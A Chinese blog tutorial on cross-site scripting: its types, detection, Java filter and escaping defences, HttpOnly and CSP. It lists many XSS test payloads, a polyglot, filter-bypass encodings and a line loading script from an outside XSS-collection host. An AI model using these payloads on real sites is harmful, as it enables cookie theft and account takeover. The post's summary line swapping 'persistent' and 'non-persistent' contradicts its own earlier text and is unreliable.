---
title: XSS的攻击原理与防御原理
copyright: true
categories: web安全
tags:
  - XSS
  - 跨站脚本攻击
abbrlink: 9ee0c5
date: 2019-08-21 09:38:18
---

<blockquote class="blockquote-center">迟日江山丽，春风花草香
</blockquote>

　　xss又称跨站脚本攻击，原称为css（Cross-Site Scripting），因为和层叠样式表(Cascading Style Sheets)重名，所以又称为xss(x一般有未知的含义，还有扩展的含义)。

<!-- more -->

### XSS的攻击原理

　　xss攻击涉及到了攻击者，用户和web server。主要是利用了网站本身设计的不严谨性，攻击者通过对网页插入恶意的攻击脚本，导致当用户在浏览网页的时候，嵌入其中的攻击脚本就会被执行，从而达到恶意攻击用户的特殊目的。攻击者通过xss攻击，可以获取到用户的cookie，然后发送给攻击者想要攻击的网站，因为跨站了，所以也称为跨站脚本攻击。

### XSS的分类

　　根据攻击的来源，xss攻击的分类主要分为：反射型xss、存储型xss和DOM型xss三种。

#### 反射型xss

　　反射型xss，也叫“非持久型xss”。用户点击攻击链接，触发了恶意脚本，服务器解析后响应，在返回的响应内容中出现攻击者的xss代码，被浏览器执行。一来一去，xss攻击脚本被web server反射回来给浏览器执行，所以称为反射型xss。

反射型xss的攻击步骤：

　　1、攻击者构造出特殊的URL，其中包含恶意代码；

　　2、用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回给浏览器；

　　3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；

　　4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

特点：

　　1、攻击脚本非持久性，没有保存在web server中，而是直接出现在了URL地址中；

　　2、反射型xss漏洞常见于通过URL传递参数的功能，如网站搜索、跳转等；

　　3、由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。一般通过邮件、社交软件等方式直接发送攻击URL，通过用户的点击来达到攻击目的的。

　　POST的内容也可以触发反射型xss，只不过其触发条件比较苛刻，需要构造表单提交页面，并引导用户点击，所以非常少见。

#### 存储型xss

　　存储型xss，也叫“持久型xss”，相比反射型xss，存储型xss是把恶意脚本保存到了web server中的，这种攻击具有较强的稳定性和持久性，危害性也更大。这样每一个访问特定网页的用户，都会受到攻击。

存储型xss的攻击步骤：

　　1、攻击者将恶意代码提交到目标网站的数据库中；

　　2、用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器；

　　3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；

　　4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

特点：

　　1、攻击脚本持久性，保存在web server中；

　　2、这种攻击常见于带有用户保存数据的网站功能，一般通过论坛发帖、商品评论、用户私信等功能（所有能够向web server输入内容的地方），将攻击脚本存储到web server中。

　　有时候反射型xss和存储型xss是同时使用的，比如：先通过对一个攻击url进行编码（来绕过xss filter），提交到web server（存储在web server中），然后用户在浏览页面时，如果点击该url，就会触发一个xss攻击。当然用户点击该url时，也可能会触发一个CSRF（Cross site request forgery）攻击。

#### DOM型xss

　　DOM（Document Object Model） --based 漏洞是基于文档对象模型的一种漏洞，通过修改页面的DOM节点而形成的xss漏洞。

DOM型xss的攻击步骤：

　　1、攻击者构造出特殊的URL，其中包含恶意代码。

　　2、用户打开带有恶意代码的URL。

　　3、用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。

　　4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

　　DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

特点：

　　1、攻击脚本不与服务端交互的，只与客户端上的js交互，攻击脚本放到了js中执行，然后显示出来；

　　2、DOM型xss也是一种反射型xss。

#### 小结

　　反射型xss跟存储型xss的区别是：`存储型xss非持久性，攻击脚本存在服务器里`，`反射型xss持久性，攻击脚本存在URL里`。

　　DOM型xss跟前两种xss的区别：DOM型xss，是通过修改页面的DOM节点来形成xss的，取出和执行恶意代码由浏览器端完成，属于`前端JavaScript自身的安全漏洞`，而其他两种xss都属于`服务端的安全漏洞`。


| 类型 | 存储区 | 插入点 |
| :---- | ----- | ------ |
| 存储型 XSS | 后端数据库 | HTML |
| 反射型 XSS | URL | HTML |
| DOM型 XSS | 后端数据库/前端存储/URL | 前端 JavaScript |

### XSS漏洞的检测

#### xss探针

　　xss探针可检测出网站有没有对xss漏洞做最基础的防御。

　　在测试xss的位置写入代码，查看页面源码，看看哪些代码被过滤或者转义了。

```
'';!--"<XSS>=&{()}
```

#### xss语句

　　除了xss探针以外，还可以输入最简单的测试语句

```
<script>alert(/xss/)</script>
```

　　如果插入的语句原封不动的呈现在了浏览器中，那么说明：

- 代码没有被过滤，存在xss；
- 代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。

#### 常用的xss检测语句

```
<script>alert(/xss/);</script>
<script>alert(/xss/)//
<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//用分号，也可以分号+空格（回车一起使用）
<img src=1 onmouseover=alert(1)>
<a herf=1 onload=alert(1)>nmask</a>
<script>window.a==1?1:prompt(a=1)</script>
<script>a=prompt;a(1)</script>
<img src=0 onerror=confirm('1')>
<script>alert(1)</script>
<script src="http://xsspt.com/vA4t1W?1542101296"></script>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">xss</a>
<svg onload=alert(1)>
<input type="text" name="test" onclick=alert(1)>
<iframe src="javascript:alert(/xss/)">xss</iframe>
<iframe srcdoc="<script>alert&#40;1&#41;</script>">
```

#### 使用GIthub上的终极xss工具

👉[传送门](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

　　它能够检测到存在于HTML属性、HTML文字内容、HTML注释、跳转链接、内联JavaScript字符串、内联CSS 样式表等多种上下文中的XSS漏洞，也能检测 `eval()`、`setTimeout()`、`setInterval()`、`Function()`、`innerHTML`、`document.write()`等DOMXSS漏洞，并且能绕过一些XSS过滤器。

　　只要在网站的各输入框中提交这个字符串，或者把它拼接到URL参数上，就可以进行检测了。

#### 自动化扫描工具

　　　除了手动检测之外，还可以使用自动扫描工具寻找xss漏洞，例如 [Arachni](https://github.com/Arachni/arachni)、[Mozilla HTTP Observatory](https://github.com/mozilla/http-observatory/)、[w3af](https://github.com/andresriancho/w3af) 等。

### XSS产生的原因

　　xss存在的根本原因是，对URL中的参数，对用户输入提交给web server的内容，没有进行充分的过滤。如果我们能够在web程序中，对用户提交的URL中的参数，和提交的所有内容，进行充分的过滤，将所有的不合法的参数和输入内容过滤掉，那么就不会导致在用户的浏览器中执行攻击者自己定制的脚本。

　　但是，**其实充分而完全的过滤，实际上是无法实现的**。因为攻击者有各种各样的神奇的，你完全想象不到的方式来绕过服务器端的过滤，最典型的就是对URL和参数进行各种的编码，比如escape，encodeURI，encodeURIComponent，8进制，10进制，16进制，来绕过xss过滤。那么我们如何来防御xss呢？

### XSS攻击的防御

XSS 攻击有两大要素：

> 1、攻击者提交恶意代码。
>
> 2、浏览器执行恶意代码。

　　比较常规的思路是：**对输入和URL参数进行过滤，对输出进行编码**。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容。然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。**虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的xss攻击**。

#### XSS filter

对输入和URL参数进行过滤（黑白名单），常用的xss filter的实现代码：

```
public class XssFilter implements Filter {

    public void init(FilterConfig config) throws ServletException {}

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) 
            throws IOException, ServletException {
        XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest)request);
        chain.doFilter(xssRequest, response);
    }

    public void destroy() {}
}
```

```
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {
    HttpServletRequest orgRequest = null;

    public XssHttpServletRequestWrapper(HttpServletRequest request) {
        super(request);
        orgRequest = request;
    }
    /**
     * 覆盖getParameter方法，将参数名和参数值都做xss过滤。<br/>
     * 如果需要获得原始的值，则通过super.getParameterValues(name)来获取<br/>
     * getParameterNames,getParameterValues和getParameterMap也可能需要覆盖
     */
    @Override
    public String getParameter(String name) {
        String value = super.getParameter(xssEncode(name));
        if (value != null) {
            value = xssEncode(value);
        }
        return value;
    }
    /**
     * 覆盖getHeader方法，将参数名和参数值都做xss过滤。<br/>
     * 如果需要获得原始的值，则通过super.getHeaders(name)来获取<br/>
     * getHeaderNames 也可能需要覆盖
     */
    @Override
    public String getHeader(String name) {
        String value = super.getHeader(xssEncode(name));
        if (value != null) {
            value = xssEncode(value);
        }
        return value;
    }
    /**
     * 将容易引起xss漏洞的半角字符直接替换成全角字符
     *
     * @param s
     * @return
     */
    private static String xssEncode(String s) {
        if (s == null || s.isEmpty()) {
            return s;
        }
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
            case '>':
                sb.append('＞');// 全角大于号
                break;
            case '<':
                sb.append('＜');// 全角小于号
                break;
            case '\'':
                sb.append('‘');// 全角单引号
                break;
            case '\"':
                sb.append('“');// 全角双引号
                break;
            case '&':
                sb.append('＆');// 全角
                break;
            case '\\':
                sb.append('＼');// 全角斜线
                break;
            case '#':
                sb.append('＃');// 全角井号
                break;
            case '%':    // < 字符的 URL 编码形式表示的 ASCII 字符（十六进制格式） 是: %3c
                processUrlEncoder(sb, s, i);
                break;
            default:
                sb.append(c);
                break;
            }
        }
        return sb.toString();
    }
    public static void processUrlEncoder(StringBuilder sb, String s, int index){
        if(s.length() >= index + 2){
            if(s.charAt(index+1) == '3' && (s.charAt(index+2) == 'c' || s.charAt(index+2) == 'C')){    // %3c, %3C
                sb.append('＜');
                return;
            }
            if(s.charAt(index+1) == '6' && s.charAt(index+2) == '0'){    // %3c (0x3c=60)
                sb.append('＜');
                return;
            }            
            if(s.charAt(index+1) == '3' && (s.charAt(index+2) == 'e' || s.charAt(index+2) == 'E')){    // %3e, %3E
                sb.append('＞');
                return;
            }
            if(s.charAt(index+1) == '6' && s.charAt(index+2) == '2'){    // %3e (0x3e=62)
                sb.append('＞');
                return;
            }
        }
        sb.append(s.charAt(index));
    }
    /**
     * 获取最原始的request
     *
     * @return
     */
    public HttpServletRequest getOrgRequest() {
        return orgRequest;
    }
    /**
     * 获取最原始的request的静态方法
     *
     * @return
     */
    public static HttpServletRequest getOrgRequest(HttpServletRequest req) {
        if (req instanceof XssHttpServletRequestWrapper) {
            return ((XssHttpServletRequestWrapper) req).getOrgRequest();
        }
        return req;
    }
}
```

然后在web.xml中配置该filter：

```
<filter>
        <filter-name>xssFilter</filter-name>
        <filter-class>com.xxxxxx.filter.XssFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>xssFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```

　　主要的思路就是**将容易导致XSS攻击的边角字符替换成全角字符**。`< `和` > `是脚本执行和各种html标签需要的，比如 `<script>`，`& `和 `# `以及 `% `在对URL编码试图绕过xss filter时，会出现。我们说对输入的过滤分为白名单和黑名单。上面的xss filter就是一种黑名单的过滤，黑名单就是列出不能出现的对象的清单，一旦出现就进行处理。还有一种白名单的过滤，白名单就是列出可被接受的内容，比如规定所有的输入只能是`大小写的26个英文字母`和`10个数字`，还有`-`和`_`，所有其他的输入都是非法的，会被抛弃掉。很显然如此严格的白名单是可以100%拦截所有的xss攻击的，但是现实情况一般是不能进行如此严格的白名单过滤的。

　　对于输入，处理使用xss filter之外，对于每一个输入，在客户端和服务器端还要进行各种验证，验证是否合法字符，长度是否合法，格式是否正确。在客户端和服务端都要进行验证，因为客户端的验证很容易被绕过。其实这种验证也分为了黑名单和白名单。黑名单的验证就是不能出现某些字符，白名单的验证就是只能出现某些字符。尽量使用白名单，虽然白名单无法完全杜绝xss，但是使用不当的话可能会带来很高的误报率。

#### 存储型和反射型XSS攻击的防御

　　存储型和反射型xss都是在服务端取出恶意代码后，插入到响应HTML里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。

预防这两种漏洞，有两种常见做法：

- **改成纯前端渲染，把代码和数据分隔开。**

纯前端渲染的过程：

1、浏览器先加载一个静态HTML，此HTML中不包含任何跟业务相关的数据。

2、然后浏览器执行HTML中的JavaScript。

3、JavaScript通过Ajax加载业务数据，调用DOM API更新到页面上。

　　在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本`.innerText`，还是属性`.setAttribute`，还是样式`.style`等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。

　　但纯前端渲染还需注意避免DOM型xss漏洞，例如 `onload` 事件和 `href` 中的 `javascript:xxx` 等。在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接HTML的问题。

- **对HTML做充分转义。**

　　如果拼接HTML是必要的，就需要采用合适的转义库，对HTML模板各处插入点进行充分的转义。

　　对于HTML转义通常只有一个规则，就是把 `& < > " ' /` 这几个字符转义掉，确实能起到一定的xss防护作用，但并不完善。要完善xss防护措施，要使用更完善更细致的转义策略。例如Java工程里，常用的转义库为 `org.owasp.encoder`。

| XSS 安全漏洞      | 简单转义是否有防护作用 |
| :---------------- | ---------------------- |
| HTML 标签文字内容 | 有                     |
| HTML 属性值       | 有                     |
| CSS 内联样式      | 无                     |
| 内联 JavaScript   | 无                     |
| 内联 JSON         | 无                     |
| 跳转链接          | 无                     |

　　在输出数据之前对潜在的威胁的字符进行编码、转义对xss攻击能起到一定的防御作用。

　　对所有要动态输出到页面的内容，通通进行相关的编码和转义。当然转义是按照其输出的上下文环境来决定如何转义的。

作为body文本输出，html标签的属性输出，比如：

```
<span>${username}</span>
<p><c:out value="${username}"></c:out></p>
<input type="text" value="${username}" />
```

此时的转义规则如下：

`< `转成 `&lt;`　　`> `转成 `&gt;`　　`&` 转成 `&amp;`　　`" `转成 `&quot;`

`' `转成 `&#39`　　`\ `转成` \\`　　　`/ `转成 `\/`　　`; `转成 `；(全角;)`

javascript事件

```
<input type="button" οnclick='go_to_url("${myUrl}");' />
```

URL属性

　　如果 `<script>、<style>、<imt> `等标签的 src 和 href 属性值为动态内容，那么要确保这些URL没有执行恶意连接。确保：`href `和 `src `的值必须以 `http://`开头，白名单方式；不能有`10进制`和`16进制`编码字符。

#### DOM型XSS攻击的防御

　　DOM型xss攻击，实际上就是网站前端JavaScript代码本身不够严谨，把不可信的数据当作代码执行了。

　　在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为HTML插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。

　　如果用Vue/React技术栈，并且不使用 `v-html`/`dangerouslySetInnerHTML` 功能，就在前端render阶段避免 `innerHTML`、`outerHTML` 的xss隐患。

　　DOM中的内联事件监听器，如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等，`<a>` 标签的 `href` 属性，JavaScript的 `eval()`、`setTimeout()`、`setInterval()`等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些API，很容易产生安全隐患，请务必避免。

```
<!-- 内联事件监听器中包含恶意代码 --> 
 < img   onclick = "UNTRUSTED"   onerror = "UNTRUSTED"   src = "data:image/png," > 
 <!-- 链接内包含恶意代码 --> 
 < a   href = "UNTRUSTED" > 1 </ a > 
 < script >  
 // setTimeout()/setInterval() 中调用恶意代码 
setTimeout( "UNTRUSTED" )
setInterval( "UNTRUSTED" )
 // location 调用恶意代码 
location.href =  'UNTRUSTED' 
 // eval() 中调用恶意代码 
 eval ( "UNTRUSTED" )
  </ script > 
```

#### 其他xss攻击的防御

##### HttpOnly 

　　xss一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对 Cookie 设置了HttpOnly 属性，那么js脚本将无法读取到cookie，但是浏览器还是能够正常使用cookie，这样能有效的防止xss的攻击。

　　一般的Cookie都是从document对象中获得的，现在浏览器在设置 Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一旦这个HttpOnly被设置，**你在浏览器的 document对象中就看不到Cookie了，而浏览器在浏览的时候不受任何影响**，因为Cookie会被放在浏览器头中发送出去(包括ajax的时候)，应用程序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。

##### Content Security Policy（内容安全策略）

严格的CSP在XSS的防范中可以起到以下的作用：

> 禁止加载外域代码，防止复杂的攻击逻辑。
>
> 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
>
> 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
>
> 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
>
> 合理使用上报可以及时发现 XSS，利于尽快修复问题。

##### 输入内容长度控制

　　对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止xss发生，但可以增加xss攻击的难度。

#### 小结

　　**XSS攻击防御方法：XSS filter；纯前端渲染，数据分离；HTML转义；设置HttpOnly属性；设置CSP；限制输入内容的长度**

### XSS绕过的技巧

　　有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。

#### 大小写绕过

```
<Script>alert(1)</Script>
```

#### 双写绕

```
<scrscriptipt>alert(1)</scrscriptipt>
```

#### 替换绕过

```
过滤 alert 用prompt，confirm，top['alert'](1)代替绕过过滤() 用``代替绕过过滤空格 用%0a（换行符）,%0d（回车符），/**/代替绕过小写转大写情况下 字符ſ大写后为S（ſ不等于s）
```

#### %00截断绕过

```
<a href=javascr%00ipt:alert(1)>xss</a>
```

#### 编码绕过

```
实体编码
javascrip&#x74;:alert(1) 十六进制
javascrip&#116;:alert(1) 十进制

unicode编码
javascrip\u0074:alert(1)

url编码
javascrip%74:alert(1)
```

#### fromCharCode方法绕过

```
String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)
eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
```

#### javascript伪协议绕过

　　无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js

#### 换行绕过正则匹配

```
onmousedown
=alert(1)
```

#### 注释符

```
// 单行注释
<!-- --!> 注释多行内容
<!-- --> 注释多行内容
<-- --> 注释多行内容
<-- --！> 注释多行内容
--> 单行注释后面内容
/* */ 多行注释
有时还可以利用浏览器的容错性，不需要注释
```

#### 闭合标签空格绕过

```
</style ><script>alert(1)</script>
```

#### @符号绕过url限制

```
https://www.segmentfault.com@xss.haozi.me/j.js
```

其实访问的是@后面的内容

#### ")逃逸函数后接分号

```
");alert(1)//
```

#### \绕过转义限制

```html
\")
alert(1) //
```

XSS练习平台

　　以下是几个XSS攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。

[alert(1) to win](https://alf.nu/alert1) 　　[prompt(1) to win](http://prompt.ml/) 　　[XSS game](https://xss-game.appspot.com/)　　[XSS Challenges](http://xss-quiz.int21h.jp/)

### 参考资料

- [前端安全系列（一）：如何防止XSS攻击？](https://www.freebuf.com/articles/web/185654.html)
- [浅谈跨站脚本攻击与防御](https://thief.one/2017/05/31/1/)
- [面试问题如何预防xss攻击](https://blog.csdn.net/hxpjava1/article/details/81005195)
- [xss攻击原理与解决方法 ](https://www.cnblogs.com/hejianjun/p/9082054.html)
- [XSS攻击及预防](https://www.cnblogs.com/mxmbk/p/5082821.html)
- [OWASP Top 10 - 2017](http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf)